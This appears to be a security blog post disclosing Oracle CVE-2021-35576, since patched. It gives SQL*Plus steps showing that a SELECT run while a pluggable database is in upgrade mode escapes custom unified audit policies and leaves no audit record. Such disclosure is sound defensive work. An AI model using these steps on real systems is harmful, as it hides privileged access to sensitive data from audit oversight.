
# [Database Security Ninja](https://databasesecurityninja.wordpress.com/)

##

Menu
[Skip to content](#content)

* [Home](https://databasesecurityninja.wordpress.com)
* [About ME](https://databasesecurityninja.wordpress.com/about/)

Search

Search for:

# CVE-2021-35576 – Bypassing Unified Audit Policy

[June 11, 2022](https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/) / [arcsdegeo](https://databasesecurityninja.wordpress.com/author/arcsdegeo/)

This vulnerability is a complete bypass of an in-place audit policy/rule that should be honored and recorded. Let me simulate:

**I will create a table in pluggable database PDB1 under HR schema and insert few records:**

CREATE TABLE HR.EMPLOYEE

(

FIRST\_NAME  VARCHAR2(50),

LAST\_NAME   VARCHAR2(50)

);

INSERT INTO HR.EMPLOYEE (

FIRST\_NAME, LAST\_NAME)

VALUES ( ‘EMAD’,’MOUSA’ );

commit;

INSERT INTO HR.EMPLOYEE (

FIRST\_NAME, LAST\_NAME)

VALUES ( ‘SAMI’,’MOUSA’ );

commit;

**I will now create audit policy:**

CREATE AUDIT POLICY SELECT\_P1 actions select on HR.EMPLOYEE;

audit policy SELECT\_P1;

**To check audit policies configured in PDB1 database:**

SELECT \* FROM audit\_unified\_enabled\_policies;

![](https://databasesecurityninja.wordpress.com/wp-content/uploads/2022/06/audit1.png?w=1024)

**Now, let us simulate executing the select statement against the monitored/audited table while database is in upgrade mode:**

sqlplus / as sysdba

SQL> alter session set container=PDB1;

SQL> shutdown immediate;

SQL> startup upgrade;

SQL> select \* from HR.EMPLOYEE;

SQL> startup force;

SQL> exec SYS.DBMS\_AUDIT\_MGMT.FLUSH\_UNIFIED\_AUDIT\_TRAIL;

![](https://databasesecurityninja.wordpress.com/wp-content/uploads/2022/06/audit2.png?w=1012)

**Checking the audit logs using the query, **NO entry is found recorded** in the unified audit trail:**

select OS\_USERNAME,USERHOST,DBUSERNAME,CLIENT\_PROGRAM\_NAME,EVENT\_TIMESTAMP,ACTION\_NAME,OBJECT\_SCHEMA,OBJECT\_NAME,SQL\_TEXT from unified\_audit\_trail where OBJECT\_NAME=’EMPLOYEE’ order by EVENT\_TIMESTAMP desc;

So, even though audit policy was configured in the database a DBA/System Admin can view the audited sensitive table without a trace as No record will be populated in **UNIFIED\_AUDIT\_TRAIL** view !

**Conclusion:**

When database is in upgrade mode , auditing facility will only capture default audit policies such as ORA\_SECURECONFIG , and ORA\_LOGON\_FAILURES but not for ***custom audit policies***.

This venerability has been fixed in Oracle CPU October 2021 with CVE number CVE-2021-35576

### Share this:

* [Twitter](https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/?share=twitter "Click to share on Twitter")
* [Facebook](https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://databasesecurityninja.wordpress.com/category/uncategorized/)
[CVE-2021-35576](https://databasesecurityninja.wordpress.com/tag/cve-2021-35576/), [Oracle CVE-2021-35576](https://databasesecurityninja.wordpress.com/tag/oracle-cve-2021-35576/), [oracle database](https://databasesecurityninja.wordpress.com/tag/oracle-database/), [oracle database audit bypass](https://databasesecurityninja.wordpress.com/tag/oracle-database-audit-bypass/), [oracle database by pass security audit](https://databasesecurityninja.wordpress.com/tag/oracle-database-by-pass-security-audit/), [oracle database security audit vulnerability](https://databasesecurityninja.wordpress.com/tag/oracle-database-security-audit-vulnerability/), [oracle database security vulnerability](https://databasesecurityninja.wordpress.com/tag/oracle-database-security-vulnerability/), [oracle database SQL operations without audit](https://databasesecurityninja.wordpress.com/tag/oracle-database-sql-operations-without-audit/), [oracle database unified audit bypass](https://databasesecurityninja.wordpress.com/tag/oracle-database-unified-audit-bypass/), [oracle database unified audit vulnerability](https://databasesecurityninja.wordpress.com/tag/oracle-database-unified-audit-vulnerability/), [security vulnerability CVE-2021-35576](https://databasesecurityninja.wordpress.com/tag/security-vulnerability-cve-2021-35576/)

# Post navigation

[← Running SQL Server Service as local system is very bad idea ! (Escalation to Windows OS local Admin)](https://databasesecurityninja.wordpress.com/2022/05/21/running-sql-server-service-as-local-system-is-very-bad-idea-escalation-to-windows-os-local-admin/)[Privilege Elevation in Oracle CDB Architecture – Unauthorized Proxy Access￼ →](https://databasesecurityninja.wordpress.com/2022/07/16/privilege-elevation-in-oracle-cdb-architecture-unauthorized-proxy-access%EF%BF%BC/)

### Leave a comment [Cancel reply](/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/#respond)

Δ

# Blog Stats

* 160,794 hits
Search for:

# Top Posts & Pages

* [Changing SYS password in Oracle 12cR2 and 18c](https://databasesecurityninja.wordpress.com/2019/04/01/changing-sys-password-in-oracle-12cr2-and-18c/)
* [SQLNET.ALLOW\_WEAK\_CRYPTO\_CLIENTS new parameter introduced in Oracle CPU July 2021](https://databasesecurityninja.wordpress.com/2021/07/21/sqlnet-allow_weak_crypto_clients-new-parameter-introduced-in-oracle-cpu-july-2021/)
* [Purging Unified Audit Logs](https://databasesecurityninja.wordpress.com/2019/01/02/purging-unified-audit-logs/)
* [Monitoring Oracle SYS Account Password Changes](https://databasesecurityninja.wordpress.com/2023/02/13/monitoring-oracle-sys-account-password-changes/)
* [ByPassing DBMS\_REDACT Dynamic Data Masking security feature in Oracle database system](https://databasesecurityninja.wordpress.com/2023/01/03/bypassing-dbms_redact-dynamic-data-masking-security-feature-in-oracle-database-system/)
* [Extract SQL Server Database Password Hashes Without A Trace](https://databasesecurityninja.wordpress.com/2020/06/02/extract-sql-server-database-password-hashes-without-a-trace/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Database Security Ninja](https://databasesecurityninja.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdatabasesecurityninja.wordpress.com%2F2022%2F06%2F11%2Fcve-2021-35576-bypassing-unified-audit-policy%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Database Security Ninja](https://databasesecurityninja.wordpress.com)
  + [Customize](https://databasesecurityninja.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Fdatabasesecurityninja.wordpress.com%2F2022%2F06%2F11%2Fcve-2021-35576-bypassing-unified-audit-policy%2F)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdatabasesecurityninja.wordpress.com%2F2022%2F06%2F11%2Fcve-2021-35576-bypassing-unified-audit-policy%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/p8Poke-f2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/)
  + [View post in Reader](https://wordpress.com/read/blogs/130458926/posts/932)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)

